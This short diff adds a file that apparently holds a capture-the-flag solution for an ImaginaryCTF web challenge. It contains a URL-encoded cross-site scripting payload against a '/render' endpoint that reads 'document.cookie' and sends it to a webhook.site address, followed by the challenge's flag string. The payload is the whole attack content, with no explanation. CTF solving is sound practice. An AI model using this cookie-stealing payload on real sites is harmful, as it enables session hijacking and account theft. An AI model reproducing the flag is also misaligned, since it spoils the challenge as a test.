@@ -1,0 +1,3 @@
+http://puzzler7.imaginaryctf.org:1011/render?html=%0A%3Cscript%3E%0Axhr%3Dnew%20XMLHttpRequest()%0Axhr.open('GET'%2C'https%3A%2F%2Fwebhook.site%2F06eae124-3374-4350-bf71-a84da04149b2%3F'%2Bdocument.cookie%2Cfalse)%0Axhr.send()%0A%3C%2Fscript%3E%0A
+
+ictf{expect_more_xss_in_the_future!_271ef0d2}
